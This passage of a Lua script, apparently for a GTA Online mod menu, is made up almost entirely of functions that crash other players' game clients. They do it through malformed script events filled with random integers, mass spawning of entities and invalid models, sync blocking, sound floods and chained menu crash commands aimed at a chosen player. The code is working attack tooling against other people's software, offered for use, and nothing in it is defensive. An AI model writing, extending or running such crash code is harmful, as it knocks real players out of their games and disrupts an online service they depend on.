    local object = entities.create_object(util.joaat("tvtrailer"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("trflat"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("hei_prop_carrier_trailer_01"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("cs2_02_temp_trailer"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("tr_prop_tr_truktrailer_01a"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("trailer_casting"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("trailer_casting_int"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("dubsta"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("hydra"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("sm_prop_smug_havok"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("dt1_11_heliport"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("dt1_11_heliport_st"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("sf_prop_sf_heli_blade_b_02a"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("w_ex_snowball"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("w_ex_apmine"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("w_lr_homing_rocket"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("prop_xmas_tree_int"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("prop_xmas_ext"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("v_31a_jh_tunn_03aextra"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("issi8"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("kosatka"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, true, true)
    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(object, 1, 0.0, 10000.0, 0.0, 0.0, 0.0, 0.0, false, true, true, false, true)
    ENTITY.SET_ENTITY_ROTATION(object, math.random(0, 360), math.random(0, 360), math.random(0, 360), 0, true)
    ENTITY.SET_ENTITY_VELOCITY(object, math.random(-10, 10), math.random(-10, 10), math.random(30, 50))
    ENTITY.ATTACH_ENTITY_TO_ENTITY(object, object, 0, 0, -1, 2.5, 0, 180, 0, 0, false, true, false, 0, true)
    util.yield(300)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(cord.x, cord.y, cord.z + 1, cord.x, cord.y, cord.z, 0, true, util.joaat("weapon_heavysniper_mk2"), players.user_ped(), false, true, 1.0)
    ENTITY.DETACH_ENTITY(object, object)
end

function rocketkoko(PlayerID)
    local stupid_pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)) stupid_pos.x = stupid_pos.x - 2
    util.create_thread(function ()
    local mod_vel = {-692292317,-1323100960,4244420235,444583674,184361638,642617954,586013744,920453016,3186376089,1030400667,240201337,
    1492612435, 3517794615, 3889340782, 3253274834,970385471, 2336777441, 184361638, 1030400667, 920453016, 240201337, 642617954, 
    586013744, 868868440, 1550581940, 3334677549, 3186376089,0xc5dd6967,0x58f77553,0x1446590a}
    for _spawn, value in pairs(mod_vel) do
    local s = {}
    for i = 1, 10, 1 do  
    s[_spawn] = CreateVehicle(value,stupid_pos,0)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Entity, true, false)
    wait(0)
    end
    end
    wait(0)
    local ar_vs = entities.get_all_vehicles_as_handles()
    for key, value in pairs(ar_vs) do
    entities.delete_by_handle(value)
    end
    end,nil)
end

function weedfire(PlayerID)
    local cord = getEntityCoords(getPlayerPed(PlayerID))
    local a1 = entities.create_object(-930879665, cord)
    local a2 = entities.create_object(3613262246, cord)
    local b1 = entities.create_object(452618762, cord)
    local b2 = entities.create_object(3613262246, cord)
    for i = 1, 10 do
        util.request_model(-930879665)
        util.yield(10)
        util.request_model(3613262246)
        util.yield(10)
        util.request_model(452618762)
        util.yield(10)
        entities.delete_by_handle(a1)
        entities.delete_by_handle(a2)
        entities.delete_by_handle(b1)
        entities.delete_by_handle(b2)
        util.request_model(452618762)
        util.yield(10)
        util.request_model(3613262246)
        util.yield(10)
        util.request_model(-930879665)
        flag = entities.create_object(util.joaat("apa_prop_flag_canada_yt"),cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(flag, true, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(flag, flag, 0, 0, -1, 2.5, 0, 180, 0, 0, false, true, false, 0, true)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(flag, 1, 0.0, 10000.0, 0.0, 0.0, 0.0, 0.0, false, true, true, false, true)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(cord.x, cord.y, cord.z + 1, cord.x, cord.y, cord.z, 0, true, util.joaat("apa_prop_flag_canada_yt"), players.user_ped(PlayerID), false, true, 1.0)
        util.yield(10)
    end
end

function reolcrash(PlayerID)
menu.trigger_commands("kill".. PLAYER.GET_PLAYER_NAME(PlayerID))
menu.trigger_commands("sendtojob".. PLAYER.GET_PLAYER_NAME(PlayerID))
menu.trigger_commands("choke".. PLAYER.GET_PLAYER_NAME(PlayerID))
menu.trigger_commands("ngcrash".. PLAYER.GET_PLAYER_NAME(PlayerID))
menu.trigger_commands("footlettuce".. PLAYER.GET_PLAYER_NAME(PlayerID))
menu.trigger_commands("steamroll".. PLAYER.GET_PLAYER_NAME(PlayerID))
local stupid_pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)) 
local stupid_pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)) stupid_pos.x = stupid_pos.x - 2
util.create_thread(function ()
local mod_vel = {-692292317,-1323100960,4244420235,444583674,184361638,642617954,586013744,920453016,3186376089,1030400667,240201337,
1492612435, 3517794615, 3889340782, 3253274834,970385471, 2336777441, 184361638, 1030400667, 920453016, 240201337, 642617954, 
586013744, 868868440, 1550581940, 3334677549, 3186376089,0xc5dd6967,0x58f77553,0x1446590a}
for _spawn, value in pairs(mod_vel) do
local s = {}
for i = 1, 10, 1 do  
s[_spawn] = CreateVehicle(value,stupid_pos,0)
ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Entity, true, false)
wait(0)
end
end
wait(0)
local ar_vs = entities.get_all_vehicles_as_handles()
for key, value in pairs(ar_vs) do
entities.delete_by_handle(value)
end
end,nil)
end

function commandsc(PlayerID)
    menu.trigger_commands("12crash".. PLAYER.GET_PLAYER_NAME(PlayerID))
    menu.trigger_commands("fragment".. PLAYER.GET_PLAYER_NAME(PlayerID))
    menu.trigger_commands("loveclick".. PLAYER.GET_PLAYER_NAME(PlayerID))
    menu.trigger_commands("trollcrash".. PLAYER.GET_PLAYER_NAME(PlayerID))
    menu.trigger_commands("nsacrash".. PLAYER.GET_PLAYER_NAME(PlayerID))
end
--
function spawn_vehicle(hash,pos,isGodMode,isFreeze)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do		
		wait(1)
	end
   local car= entities.create_vehicle(hash,pos,0)
    if isGodMode then 
        ENTITY.SET_ENTITY_INVINCIBLE(car,true)
    end
    if isFreeze then
        ENTITY.FREEZE_ENTITY_POSITION(car,true)
    end
    return car
end

function delete_entity_by_vehicle(hash)
    for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
        if ENTITY.GET_ENTITY_MODEL(ent)==hash then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)
        end
    end
end
--赞助崩
function ogcrash(PlayerID)
    local nameog = PLAYER.GET_PLAYER_NAME(PlayerID)
    gtoast("发送到" ..nameog)
    util.trigger_script_event(1 << PlayerID, {891653640, 0, 81468, 96773, 84776, 2939, 20158,  14219,  38254,  22206})
    menu.trigger_commands("choke".. PLAYER.GET_PLAYER_NAME(PlayerID))
    menu.trigger_commands("steamroll".. PLAYER.GET_PLAYER_NAME(PlayerID))
    menu.trigger_commands("rainbowpapaw".. PLAYER.GET_PLAYER_NAME(PlayerID))
    menu.trigger_commands("brotakecc".. PLAYER.GET_PLAYER_NAME(PlayerID))
    menu.trigger_commands("toggleyulemonster".. PLAYER.GET_PLAYER_NAME(pid) .. " on")
    wait(1000)
    menu.trigger_commands("toggleyulemonster".. PLAYER.GET_PLAYER_NAME(pid) .. " off")
end

--奥特曼崩V1
function aotemanv1(PlayerID)
	local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local SpawnPed_Wade = { }
    for i = 1, 60 do
        SpawnPed_Wade[i] = CreatePed(26, util.joaat("PLAYER_TWO"),TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        wait(1)
    end
    wait(5000)
    for i = 1, 60 do
        entities.delete_by_handle(SpawnPed_Wade[i])
    end
end

--奥特曼崩V2
function aotemanv2(PlayerID)
local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local SpawnPed_Wade = { }
    for i = 1, 60 do
        SpawnPed_Wade[i] = CreatePed(26, util.joaat("PLAYER_ZERO"),TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        wait(1)
    end
    wait(5000)
    for i = 1, 60 do
        entities.delete_by_handle(SpawnPed_Wade[i])
    end
end

--奥特曼崩V3
function aotemanv3(PlayerID)
local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local SpawnPed_Wade = { }
    for i = 1, 60 do
        SpawnPed_Wade[i] = CreatePed(26, util.joaat("PLAYER_ONE"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        wait(1)
    end
    wait(5000)
    for i = 1, 60 do
        entities.delete_by_handle(SpawnPed_Wade[i])
    end
end

---因莎拉崩溃
function inshellcrash(PlayerID)
    local TargetPPos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))
    local PED1  = CreatePed(28,-1011537562,TargetPPos,0)
    local PED2  = CreatePed(28,-541762431,TargetPPos,0)
    WEAPON.GIVE_WEAPON_TO_PED(PED1,-1813897027,1,true,true)
    WEAPON.GIVE_WEAPON_TO_PED(PED2,-1813897027,1,true,true)
    wait(1000)
    TASK.TASK_THROW_PROJECTILE(PED1,TargetPPos.x,TargetPPos.y,TargetPPos.z,0,0)
    TASK.TASK_THROW_PROJECTILE(PED2,TargetPPos.x,TargetPPos.y,TargetPPos.z,0,0)
    notification("Finished.",colors.red)
end

--for 大自然崩溃v1 v2 泡泡糖崩溃 绿玩保护崩溃
local function BlockSyncs(PlayerID, callback)
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= PlayerID then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "on")
        end
    end
    wait(10)
    callback()
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= PlayerID then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "off")
        end
    end
end

--大自然崩溃
function naturecrashv1(PlayerID)
    local user = players.user()
    local user_ped = players.user_ped()
    local pos = players.get_position(user)
    BlockSyncs(PlayerID, function()
        wait(100)
        menu.trigger_commands("invisibility on")
        for i = 0, 110 do
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, 0xFBF7D21F)
            PED.SET_PED_COMPONENT_VARIATION(user_ped, 5, i, 0, 0)
            wait(50)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        end
        wait(250)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        menu.trigger_commands("invisibility off")
    end)
end

---大自然崩溃 v2
function naturecrashv2(PlayerID)
    local user = players.user()
    local user_ped = players.user_ped()
    local pos = players.get_position(user)
    BlockSyncs(PlayerID, function() 
        wait(100)
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
        TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
        wait()
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
        wait(250)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        wait(1000)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
    end)
end
--悲伤的耶稣
function greifcrash(PlayerID)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local pos = players.get_position(PlayerID)
		local mdl = util.joaat("u_m_m_jesus_01")
		local veh_mdl = util.joaat("oppressor")
		util.request_model(veh_mdl)
        util.request_model(mdl)
			for i = 1, 10 do
				if not players.exists(PlayerID) then
					return
				end
				local veh = entities.create_vehicle(veh_mdl, pos, 0)
				local jesus = entities.create_ped(2, mdl, pos, 0)
				PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
				wait(100)
				TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
				wait(1000)
				entities.delete_by_handle(jesus)
				entities.delete_by_handle(veh)
			end
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
end

function sugercrash(PlayerID)
    local mdl = util.joaat("apa_mp_apa_yacht")
    local user = players.user_ped()
    BlockSyncs(PlayerID, function()
    wait(250)
    local old_pos = ENTITY.GET_ENTITY_COORDS(user, false)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user, 0xFBAB5776, 100, false)
    PLAYER.SET_PLAYER_HAS_RESERVE_PARACHUTE(players.user())
    Jinx.SET_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user(), mdl)
    wait(50)
    local pos = players.get_position(PlayerID)
    pos.z += 300
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
    repeat
        wait()
    until PED.GET_PED_PARACHUTE_STATE(user) == 0
    PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
    wait(50)
    TASK.CLEAR_PED_TASKS(user)
    wait(50)
    PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
    repeat
        wait()
    until PED.GET_PED_PARACHUTE_STATE(user) ~= 1
    pcall(TASK.CLEAR_PED_TASKS_IMMEDIATELY, user)
    Jinx.CLEAR_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user())
    pcall(ENTITY.SET_ENTITY_COORDS, user, old_pos.x, old_pos.y, old_pos.z, false, false)
    end)
end

--crash_request_model
function request_model(hash, timeout)
    timeout = timeout or 3
    STREAMING.REQUEST_MODEL(hash)
    local end_time = os.time() + timeout
    repeat
        wait()
    until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
    return STREAMING.HAS_MODEL_LOADED(hash)
end
--绿玩保护崩溃
function cpscrash(PlayerID)
    local mdl = util.joaat('a_c_poodle')
    BlockSyncs(PlayerID, function()
        if request_model(mdl, 2) then
            local pos = players.get_position(PlayerID)
            wait(100)
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(PlayerID), 0, 3, 0), 0) 

           
            local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
            WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
            local obj
            repeat
                obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
            until obj ~= 0 or wait()
            ENTITY.DETACH_ENTITY(obj, true, true) 
            wait(1500)
            FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
            entities.delete_by_handle(ped1)
            wait(1000)
        else
            util.toast("Failed to load model. :/")
        end
    end)
end
--莱纳斯崩溃
function lestcrash(PlayerID)
    local int_min = -2147483647
    local int_max = 2147483647
    for i = 1, 150 do
    util.trigger_script_event(1 << PlayerID, {2765370640, PlayerID, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
    math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
    math.random(int_min, int_max), PlayerID, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
end
wait()
    for i = 1, 15 do
    util.trigger_script_event(1 << PlayerID, {1348481963, PlayerID, math.random(int_min, int_max)})
    end
menu.trigger_commands("givesh " .. players.get_name(PlayerID))
wait(100)
util.trigger_script_event(1 << PlayerID, {495813132, PlayerID, 0, 0, -12988, -99097, 0})
util.trigger_script_event(1 << PlayerID, {495813132, PlayerID, -4640169, 0, 0, 0, -36565476, -53105203})
util.trigger_script_event(1 << PlayerID, {495813132, PlayerID,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
end

--碎片崩溃
function fragmentcrash(PlayerID)
    BlockSyncs(PlayerID, function()
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        wait(1000)
        entities.delete_by_handle(object)
    end)
end
--懂哥崩
function dongge(PlayerID)
    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),0xE5022D03)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    wait(20)
    local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),p_pos.x,p_pos.y,p_pos.z,false,true,true)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 0xFBAB5776, 1000, false)
    TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1087,-3012,13.94)
    wait(500)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    wait(1000)
    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
	end


--美杜莎崩溃
function MDS(PlayerID)
    menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
	local plauuepos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    plauuepos.x = plauuepos.x + 5
    plauuepos.z = plauuepos.z + 5
    local hunter = {}
    for i = 1 ,3 do
        for n = 0,120 do
            hunter[n] = CreateVehicle(1077420264,plauuepos,0)
            wait(0)
            ENTITY.FREEZE_ENTITY_POSITION(hunter[n],true)
            wait(0)
            VEHICLE.EXPLODE_VEHICLE(hunter[n], true, true)
        end
        wait(190)
        for i = 1,#hunter do
            if hunter[i] ~= nil then
                entities.delete_by_handle(hunter[i])
            end
        end
    end
    util.toast("Finished!")
	menu.trigger_commands("anticrashcam off")
    hunter = nil
    plauuepos = nil	
end

function CreateVehicle(Hash, Pos, Heading, Invincible)
        STREAMING.REQUEST_MODEL(Hash)
        while not STREAMING.HAS_MODEL_LOADED(Hash) do wait() end
        local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
        if Invincible then
            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
        end
        return SpawnedVehicle
    end

function CreateObject(Hash, Pos, static)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do wait() end
    local SpawnedVehicle = entities.create_object(Hash, Pos)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    if static then
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicle, true)
    end
    return SpawnedVehicle
end

function CreatePed(index, Hash, Pos, Heading)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do wait() end
    local SpawnedVehicle = entities.create_ped(index, Hash, Pos, Heading)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    return SpawnedVehicle
end

---马桶崩溃
function toiletcrash(PlayerID)
    for i = 1, 10 do
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local cord = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        STREAMING.REQUEST_MODEL(-930879665)
        wait(10)
        STREAMING.REQUEST_MODEL(3613262246)
        wait(10)
        STREAMING.REQUEST_MODEL(452618762)
        wait(10)
        while not STREAMING.HAS_MODEL_LOADED(-930879665) do wait() end
        while not STREAMING.HAS_MODEL_LOADED(3613262246) do wait() end
        while not STREAMING.HAS_MODEL_LOADED(452618762) do wait() end
        local a1 = entities.create_object(-930879665, cord)
        wait(10)
        local a2 = entities.create_object(3613262246, cord)
        wait(10)
        local b1 = entities.create_object(452618762, cord)
        wait(10)
        local b2 = entities.create_object(3613262246, cord)
        wait(300)
        entities.delete_by_handle(a1)
        entities.delete_by_handle(a2)
        entities.delete_by_handle(b1)
        entities.delete_by_handle(b2)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(452618762)
        wait(10)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(3613262246)
        wait(10)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(-930879665)
        wait(10)
        end
        if SE_Notifications then
            notification("Finished.",colors.red)
        end
    end

--声音崩溃V1
function soundcrashv1(PlayerID)
    local time = util.current_time_millis() + 2000
            while time > util.current_time_millis() do
                local pos=ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
                for i = 1, 10 do
                    AUDIO.PLAY_SOUND_FROM_COORD(-1,"10s",pos.x,pos.y,pos.z,"MP_MISSION_COUNTDOWN_SOUNDSET",true, 70, false)
                end
                wait(0)
            end
        end 

--声音崩溃V2
function soundcrashv2(PlayerID)
    local time = util.current_time_millis() + 2000
            while time > util.current_time_millis() do
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
                for i = 1, 20 do
                    AUDIO.PLAY_SOUND_FROM_COORD(-1, 'Event_Message_Purple', pos.x, pos.y, pos.z, 'GTAO_FM_Events_Soundset', true, 1000, false)
                    AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', pos.x, pos.y, pos.z, 'GTAO_FM_Events_Soundset', true, 1000, false)
                end
                wait()
            end	
        end

---无效模型崩溃
function wxcrash(PlayerID)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local Object_pizza1 = CreateObject(3613262246, TargetPlayerPos)
    local Object_pizza2 = CreateObject(2155335200, TargetPlayerPos)
    local Object_pizza3 = CreateObject(3026699584, TargetPlayerPos)
    local Object_pizza4 = CreateObject(-1348598835, TargetPlayerPos)
    for i = 0, 100 do 
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
    wait(10)
    end
    wait(2000)
    entities.delete_by_handle(Object_pizza1)
    entities.delete_by_handle(Object_pizza2)
    entities.delete_by_handle(Object_pizza3)
    entities.delete_by_handle(Object_pizza4)
    end
---5g崩溃
function x999gcrash(PlayerID)
    local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
    pos.z = pos.z + 10
    veh = entities.get_all_vehicles_as_handles()                       
    for i = 1, #veh do
     NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
     ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x,pos.y,pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
     TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 999)
     TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
    end
end
--6G崩溃
    function six6crash(PlayerID)
    local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
    pos.z = pos.z + 5
    veh = entities.get_all_vehicles_as_handles()
    for i = 1, #veh do
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x,pos.y,pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
    TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 777)
    TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 17, 888)
    TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
    end
    end

--大鸡巴崩溃
function suckmydick(PlayerID)
local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
local Object_jb1 = CreateObject(0xD75E01A6, TargetPlayerPos)
